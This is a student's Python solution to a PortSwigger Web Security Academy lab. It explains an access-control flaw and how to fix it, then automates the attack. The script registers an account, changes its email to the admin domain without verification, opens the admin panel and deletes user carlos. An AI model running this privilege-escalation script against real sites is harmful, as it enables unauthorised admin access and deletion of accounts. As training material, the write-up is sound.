"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Inconsistent security controls

Level Description:
    This lab's flawed logic allows arbitrary users to access administrative functionality 
    that should only be available to company employees. To solve the lab, access the admin 
    panel and delete Carlos.

Vulnerability Description:
    The exploit in this lab is that anyone can register a new account and then when logged in, 
    can change their email address to an administrator email address without any verification.
    When the user has changed their email address to the admin's email address the site gives 
    the user admin privileges. 

Remediation:
    The site should do extra verification if a user is attempting to change their email address to an
    administrator email address. The site should send a verification email to the "new" email address, 
    but not change the current email address to the new one until the user has clicked a link in the 
    verification email. 

"""
import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = "ac981f491f1f9e1b8065e65b00e500db.web-security-academy.net"
register_url = f"https://{site}/register"
login_url = f"https://{site}/login"
account_url = f"https://{site}/my-account"
update_email_url = f"https://{site}/my-account/change-email"

username = "aaaa"
password = "aaaa"

"""
    Below I am sending a GET request for the registration page. Using BeautifulSoup
    I will extract the csrf token from the registration form, and I will extract the 
    link to the email client page.
"""
resp = s.get(register_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

email_client = soup.find('a', {'id':'exploit-link'}).get('href')

"""
    Below I am sending a GET request to the email client page. I will then
    use BeautifulSoup to extract the email address I will need for registering an
    account.
"""
resp = s.get(email_client)
soup = BeautifulSoup(resp.text,'html.parser')
email_address_to_parse = soup.find('h4').text

email_address = email_address_to_parse.replace("Your email address is attacker@", "")
print(f"email address is: {email_address}")

"""
    Using the csrf token found in a previous step, I am going to package it, an arbitrary username and
    password, and the email address found in the last step into an object. All emails with the email address
    found will be forwarded to the same email client.
"""
register_data = {
    'csrf' : csrf,
    'username' : username,
    'password' : password,
    'email' : f'exploit@{email_address}'
}

# register new account
resp = s.post(register_url, data=register_data)
print(f"Register status is: {resp.status_code}")

"""
    After registering a new account, I will have to check my email client and get
    the account confirmation link.
"""
resp = s.get(email_client)
soup = BeautifulSoup(resp.text,'html.parser')
confirm_email_link = soup.find('pre').text
confirm_email_link = confirm_email_link.replace("Hello!", "")
confirm_email_link = confirm_email_link.replace("Please follow the link below to confirm your email and complete registration.", "")
confirm_email_link = confirm_email_link.replace("Thanks,", "")
confirm_email_link = confirm_email_link.replace("Support team", "")
confirm_email_link = confirm_email_link.strip()

"""
    With the link, I will send a GET request to it and will have completed the account creation.
"""

resp = s.get(confirm_email_link)
print(f"account verification status: {resp.status_code}")

"""
    With a valid account now registered, I will send a GET request to the login page so I 
    can extract the csrf token from the login form. Then I will package up the csrf token with
    my login credentials and post those to the login page.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf' : csrf,
    'username' : username,
    'password' : password
}

resp = s.post(login_url, data=login_data)
print(f"Login status of: {resp.status_code}")


"""
    Once logged in, I will get the /my-account page to extract the csrf token
    for the update email address form.
"""
resp = s.get(f"{account_url}")
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

"""
    I will package up the csrf token and an arbitrary email address at "@dontwannacry.com" which will
    be interpreted by the site as an administrator email address. Since there is no verification on
    this step, my account will be elevated to have admin privileges upon a successful update email
    address post request.
"""
update_email_data = {
    'csrf' : csrf,
    'email' : 'exploit@dontwannacry.com'
}

resp = s.post(update_email_url, data=update_email_data)
print(f"Updated email with status of: {resp.status_code}")
print(resp.text)

resp = s.get(f"https://{site}/admin")
print(f"Got to admin page with status of: {resp.status_code}")

resp = s.get(f"https://{site}/admin/delete?username=carlos")
print(f"Attempted to delete carlos' profile. Received status of: {resp.status_code}")